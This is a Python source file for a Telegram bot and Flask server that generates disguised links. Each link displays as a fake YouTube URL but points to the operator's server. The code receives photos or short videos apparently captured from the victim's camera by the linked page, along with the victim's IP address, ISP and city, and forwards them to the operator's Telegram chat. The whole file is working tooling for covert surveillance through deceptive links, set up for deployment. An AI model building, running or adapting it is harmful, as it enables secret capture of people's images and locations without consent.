import os
import telebot
from flask import Flask, render_template, request, jsonify
import threading
import io

# Get Token from Koyeb Environment Variables
TOKEN = os.environ.get('TOKEN')
# Set this to your Koyeb App URL (e.g., https://mybot.koyeb.app)
BASE_URL = os.environ.get('BASE_URL', "https://your-app.koyeb.app")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# To store user settings temporarily
user_data = {}

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = message.chat.id
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("📸 8 Photos", "🎥 3s Video")
    bot.send_message(uid, "Select capture mode:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def handle_mode(message):
    uid = message.chat.id
    mode = "photo" if "Photos" in message.text else "video"
    user_data[uid] = {'mode': mode}
    msg = bot.send_message(uid, "Enter a fake YouTube ID (or type 'default' for a random one):")
    bot.register_next_step_handler(msg, finish_link)

def finish_link(message):
    uid = message.chat.id
    fake_id = message.text if message.text.lower() != 'default' else 'dQw4w9WgXcQ'
    mode = user_data[uid]['mode']
    
    # Generate the MASKED link
    real_target = f"{BASE_URL}/?id={uid}&mode={mode}"
    fake_display = f"https://youtu.be/{fake_id}?si=Encie_Check"
    
    # Formatting the link so the real URL is hidden
    final_msg = f"✅ **Link Ready!**\n\nTarget Link: [{fake_display}]({real_target})"
    bot.send_message(uid, final_msg, parse_mode="Markdown", disable_web_page_preview=True)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    ftype = request.args.get('type')
    file = request.files['file']
    if file and tid:
        data = file.read()
        if ftype == 'photo':
            bot.send_photo(tid, data)
        else:
            bot.send_document(tid, io.BytesIO(data), visible_file_name="video_capture.webm")
    return "Done"

@app.route('/log_info', methods=['POST'])
def log_info():
    info = request.json
    tid = request.args.get('id')
    msg = f"📍 **Log:**\nIP: `{info.get('ip')}`\nISP: `{info.get('org')}`\nCity: {info.get('city')}"
    bot.send_message(tid, msg, parse_mode="Markdown")
    return "Done"

def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # Run Telegram bot in background
    threading.Thread(target=run_bot).start()
    # Run Flask server
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
